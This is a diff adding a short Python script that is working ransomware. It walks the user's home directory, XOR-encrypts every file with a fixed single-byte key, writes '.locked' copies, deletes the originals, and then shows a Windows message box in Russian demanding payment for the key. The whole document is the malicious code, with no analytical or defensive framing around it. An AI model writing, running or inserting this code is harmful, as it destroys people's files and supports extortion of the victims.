@@ -1,0 +1,30 @@
+import os
+import sys
+import time
+import ctypes
+
+def encrypt_files(path, key):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            try:
+                filepath = os.path.join(root, file)
+                with open(filepath, 'rb') as f:
+                    data = f.read()
+                encrypted = bytearray([b ^ key for b in data])
+                with open(filepath + '.locked', 'wb') as f:
+                    f.write(encrypted)
+                os.remove(filepath)
+            except:
+                continue
+
+def lock_screen(message):
+    ctypes.windll.user32.MessageBoxW(0, message, "Внимание!", 0)
+
+def main():
+    user = os.path.expanduser('~')
+    key = 123  # простой XOR ключ
+    encrypt_files(user, key)
+    lock_screen("Ваши файлы зашифрованы. Оплатите, чтобы получить ключ!")
+
+if __name__ == '__main__':
+    main()
